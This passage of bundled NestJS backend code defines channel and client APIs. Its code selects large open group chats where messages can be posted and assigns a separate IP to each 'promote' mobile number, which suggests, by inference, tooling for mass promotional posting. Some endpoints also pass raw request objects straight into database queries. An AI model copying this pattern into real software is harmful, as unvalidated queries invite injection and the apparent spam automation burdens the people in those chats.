const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Build = class Build {
};
exports.Build = Build;
exports.Build = Build = __decorate([
    (0, mongoose_1.Schema)({ versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        }, })
], Build);
exports.BuildSchema = mongoose_1.SchemaFactory.createForClass(Build);
exports.BuildSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/channels/channels.controller.ts":
/*!********************************************************!*\
  !*** ./src/components/channels/channels.controller.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const channels_service_1 = __webpack_require__(/*! ./channels.service */ "./src/components/channels/channels.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const search_channel_dto_1 = __webpack_require__(/*! ./dto/search-channel.dto */ "./src/components/channels/dto/search-channel.dto.ts");
const create_channel_dto_1 = __webpack_require__(/*! ./dto/create-channel.dto */ "./src/components/channels/dto/create-channel.dto.ts");
const update_channel_dto_1 = __webpack_require__(/*! ./dto/update-channel.dto */ "./src/components/channels/dto/update-channel.dto.ts");
let ChannelsController = class ChannelsController {
    constructor(channelsService) {
        this.channelsService = channelsService;
    }
    async create(createChannelDto) {
        return this.channelsService.create(createChannelDto);
    }
    async createMultiple(createChannelDtos) {
        return this.channelsService.createMultiple(createChannelDtos);
    }
    search(query) {
        console.log(query);
        return this.channelsService.search(query);
    }
    async findAll() {
        return this.channelsService.findAll();
    }
    async findOne(channelId) {
        return this.channelsService.findOne(channelId);
    }
    async update(channelId, updateChannelDto) {
        return this.channelsService.update(channelId, updateChannelDto);
    }
    async remove(channelId) {
        return this.channelsService.remove(channelId);
    }
};
exports.ChannelsController = ChannelsController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new  channel' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_channel_dto_1.CreateChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "create", null);
__decorate([
    (0, common_1.Post)('createMultiple'),
    (0, swagger_1.ApiOperation)({ summary: 'Create multiple channels' }),
    (0, swagger_1.ApiBody)({ type: [create_channel_dto_1.CreateChannelDto] }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "createMultiple", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search channels by filters' }),
    (0, swagger_1.ApiQuery)({ name: 'channelId', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'broadcast', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'canSendMsgs', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'participantsCount', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'restricted', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'sendMessages', required: false, type: Boolean }),
    (0, swagger_1.ApiQuery)({ name: 'title', required: false, type: String }),
    (0, swagger_1.ApiQuery)({ name: 'username', required: false, type: String }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_channel_dto_1.SearchChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all  channels' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_channel_dto_1.UpdateChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "remove", null);
exports.ChannelsController = ChannelsController = __decorate([
    (0, swagger_1.ApiTags)('Channels'),
    (0, common_1.Controller)('channels'),
    __metadata("design:paramtypes", [channels_service_1.ChannelsService])
], ChannelsController);


/***/ }),

/***/ "./src/components/channels/channels.module.ts":
/*!****************************************************!*\
  !*** ./src/components/channels/channels.module.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const channels_service_1 = __webpack_require__(/*! ./channels.service */ "./src/components/channels/channels.service.ts");
const channels_controller_1 = __webpack_require__(/*! ./channels.controller */ "./src/components/channels/channels.controller.ts");
const channel_schema_1 = __webpack_require__(/*! ./schemas/channel.schema */ "./src/components/channels/schemas/channel.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let ChannelsModule = class ChannelsModule {
};
exports.ChannelsModule = ChannelsModule;
exports.ChannelsModule = ChannelsModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: channel_schema_1.Channel.name, schema: channel_schema_1.ChannelSchema }]),
        ],
        controllers: [channels_controller_1.ChannelsController],
        providers: [channels_service_1.ChannelsService],
        exports: [channels_service_1.ChannelsService]
    })
], ChannelsModule);


/***/ }),

/***/ "./src/components/channels/channels.service.ts":
/*!*****************************************************!*\
  !*** ./src/components/channels/channels.service.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const channel_schema_1 = __webpack_require__(/*! ./schemas/channel.schema */ "./src/components/channels/schemas/channel.schema.ts");
let ChannelsService = class ChannelsService {
    constructor(ChannelModel) {
        this.ChannelModel = ChannelModel;
        console.log(channel_schema_1.Channel.name);
    }
    async create(createChannelDto) {
        const createdChannel = new this.ChannelModel(createChannelDto);
        return createdChannel.save();
    }
    async createMultiple(createChannelDtos) {
        const bulkOps = createChannelDtos.map((dto) => ({
            updateOne: {
                filter: { channelId: dto.channelId },
                update: { $set: dto },
                upsert: true
            }
        }));
        await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });
        return 'Channels Saved';
    }
    async findAll() {
        return this.ChannelModel.find().exec();
    }
    async findOne(channelId) {
        const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();
        return channel;
    }
    async update(channelId, updateChannelDto) {
        const updatedChannel = await this.ChannelModel.findOneAndUpdate({ channelId }, { $set: updateChannelDto }, { new: true, upsert: true }).exec();
        return updatedChannel;
    }
    async remove(channelId) {
        const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();
    }
    async search(filter) {
        console.log(filter);
        return this.ChannelModel.find(filter).exec();
    }
    async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {
        const pattern = new RegExp(keywords.join('|'), 'i');
        const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', "i");
        const query = {
            $and: [
                { username: { $ne: null } },
                {
                    $or: [
                        { title: { $regex: pattern } },
                        { username: { $regex: pattern } }
                    ]
                },
                {
                    username: {
                        $not: {
                            $regex: "^(" + notIds.map(id => "(?i)" + id?.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))?.join("|") + ")$"
                        }
                    }
                },
                {
                    title: { $not: { $regex: notPattern } }
                },
                {
                    username: { $not: { $regex: notPattern } }
                },
                {
                    sendMessages: false,
                    broadcast: false,
                    restricted: false
                }
            ]
        };
        const sort = { participantsCount: "desc" };
        try {
            const result = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();
            return result;
        }
        catch (error) {
            console.error('Error:', error);
            return [];
        }
    }
    async executeQuery(query, sort, limit) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.ChannelModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async getActiveChannels(limit = 50, skip = 0, notIds = []) {
        const query = {
            '$and': [
                {
                    '$and': [
                        {
                            title: {
                                $exists: true,
                                $type: "string",
                                '$not': { '$regex': /online|realestat|propert|freefire|bgmi|promo|agent|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }
                            }
                        },
                        {
                            username: {
                                $exists: true,
                                $type: "string",
                                '$not': { '$regex': /online|freefire|bgmi|promo|agent|realestat|propert|board|design|realt|clas|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i }
                            }
                        },
                    ]
                },
                {
                    channelId: { '$nin': notIds },
                    participantsCount: { $gt: 1000 },
                    username: { $ne: null },
                    canSendMsgs: true,
                    restricted: false,
                    forbidden: false
                }
            ]
        };
        try {
            const pipeline = [
                { $match: query },
                { $addFields: { randomField: { $rand: {} } } },
                { $sort: { randomField: 1 } },
                { $skip: skip },
                { $limit: limit },
                { $project: { randomField: 0 } }
            ];
            const result = await this.ChannelModel.aggregate(pipeline).exec();
            return result;
        }
        catch (error) {
            console.error('🔴 Aggregation Error:', error);
            return [];
        }
    }
};
exports.ChannelsService = ChannelsService;
exports.ChannelsService = ChannelsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(channel_schema_1.Channel.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], ChannelsService);


/***/ }),

/***/ "./src/components/channels/dto/create-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/create-channel.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateChannelDto {
    constructor() {
        this.private = false;
        this.forbidden = false;
    }
}
exports.CreateChannelDto = CreateChannelDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Unique identifier for the channel',
        example: '803387987',
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is a broadcast channel',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Indicates if the channel can send messages',
        example: true,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is a megagroup',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Number of participants in the channel',
        example: 0,
    }),
    __metadata("design:type", Number)
], CreateChannelDto.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is restricted',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel can send messages',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Title of the channel',
        example: 'Earn money with Ayesha',
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Username of the channel',
        example: null,
        required: false,
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is private',
        example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        default: false, example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "forbidden", void 0);


/***/ }),

/***/ "./src/components/channels/dto/search-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/search-channel.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class SearchChannelDto {
}
exports.SearchChannelDto = SearchChannelDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Unique identifier for the channel',
        example: '803387987',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Title of the channel',
        example: 'Earn money with Ayesha',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'privacy of the channel',
        example: false,
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Username of the channel',
        example: 'ayesha_channel',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Indicates if the channel can send messages',
        example: true,
    }),
    __metadata("design:type", Boolean)
], SearchChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Minimum number of participants in the channel',
        example: 10,
    }),
    __metadata("design:type", Number)
], SearchChannelDto.prototype, "minParticipantsCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum number of participants in the channel',
        example: 100,
    }),
    __metadata("design:type", Number)
], SearchChannelDto.prototype, "maxParticipantsCount", void 0);


/***/ }),

/***/ "./src/components/channels/dto/update-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/update-channel.dto.ts ***!
  \***********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_channel_dto_1 = __webpack_require__(/*! ./create-channel.dto */ "./src/components/channels/dto/create-channel.dto.ts");
class UpdateChannelDto extends (0, swagger_1.PartialType)(create_channel_dto_1.CreateChannelDto) {
}
exports.UpdateChannelDto = UpdateChannelDto;


/***/ }),

/***/ "./src/components/channels/schemas/channel.schema.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/schemas/channel.schema.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelSchema = exports.Channel = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose = __importStar(__webpack_require__(/*! mongoose */ "mongoose"));
let Channel = class Channel {
};
exports.Channel = Channel;
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], Channel.prototype, "channelId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "broadcast", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], Channel.prototype, "canSendMsgs", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], Channel.prototype, "participantsCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "restricted", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "sendMessages", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Channel.prototype, "title", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: null }),
    __metadata("design:type", String)
], Channel.prototype, "username", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "private", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false, required: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "forbidden", void 0);
exports.Channel = Channel = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Channel);
exports.ChannelSchema = mongoose_1.SchemaFactory.createForClass(Channel);


/***/ }),

/***/ "./src/components/clients/client.controller.ts":
/*!*****************************************************!*\
  !*** ./src/components/clients/client.controller.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const client_service_1 = __webpack_require__(/*! ./client.service */ "./src/components/clients/client.service.ts");
const create_client_dto_1 = __webpack_require__(/*! ./dto/create-client.dto */ "./src/components/clients/dto/create-client.dto.ts");
const search_client_dto_1 = __webpack_require__(/*! ./dto/search-client.dto */ "./src/components/clients/dto/search-client.dto.ts");
const update_client_dto_1 = __webpack_require__(/*! ./dto/update-client.dto */ "./src/components/clients/dto/update-client.dto.ts");
let ClientController = class ClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        try {
            return await this.clientService.create(createClientDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async search(query) {
        try {
            return await this.clientService.search(query);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async searchByPromoteMobile(mobile) {
        try {
            const result = await this.clientService.enhancedSearch({ promoteMobileNumber: mobile });
            return {
                clients: result.clients,
                matches: result.promoteMobileMatches || [],
                searchedMobile: mobile
            };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async enhancedSearch(query) {
        try {
            const result = await this.clientService.enhancedSearch(query);
            return {
                clients: result.clients,
                searchType: result.searchType,
                promoteMobileMatches: result.promoteMobileMatches,
                totalResults: result.clients.length
            };
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async updateClient(clientId) {
        this.clientService.updateClient(clientId);
        return "Update client initiated";
    }
    async findAllMasked() {
        try {
            return await this.clientService.findAllMasked();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async findAll() {
        try {
            return await this.clientService.findAll();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async syncNpoint() {
        try {
            await this.clientService.checkNpoint();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async findOne(clientId) {
        try {
            return await this.clientService.findOne(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async update(clientId, updateClientDto) {
        try {
            return await this.clientService.update(clientId, updateClientDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async remove(clientId) {
        try {
            return await this.clientService.remove(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async executeQuery(requestBody) {
        const { query, sort, limit, skip } = requestBody;
        try {
            return await this.clientService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async addPromoteMobile(clientId, body) {
        return this.clientService.addPromoteMobile(clientId, body.mobileNumber);
    }
    async removePromoteMobile(clientId, body) {
        try {
            return await this.clientService.removePromoteMobile(clientId, body.mobileNumber);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async getClientIpInfo(clientId) {
        try {
            const client = await this.clientService.findOne(clientId);
            const needingAssignment = await this.clientService.getMobilesNeedingIpAssignment(clientId);
            const result = {
                clientId,
                mobiles: {
                    mainMobile: undefined,
                    promoteMobiles: []
                },
                needingAssignment
            };
            if (client.mobile) {
                const hasIp = await this.clientService.hasMobileAssignedIp(client.mobile);
                const ipAddress = hasIp ? await this.clientService.getIpForMobile(client.mobile) : undefined;
                result.mobiles.mainMobile = {
                    mobile: client.mobile,
                    hasIp,
                    ipAddress: ipAddress || undefined
                };
            }
            const promoteMobiles = await this.clientService.getPromoteMobiles(clientId);
            for (const mobile of promoteMobiles) {
                const hasIp = await this.clientService.hasMobileAssignedIp(mobile);
                const ipAddress = hasIp ? await this.clientService.getIpForMobile(mobile) : undefined;
                result.mobiles.promoteMobiles.push({
                    mobile,
                    hasIp,
                    ipAddress: ipAddress || undefined
                });
            }
            return result;
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async getIpForMobile(mobile, clientId) {
        try {
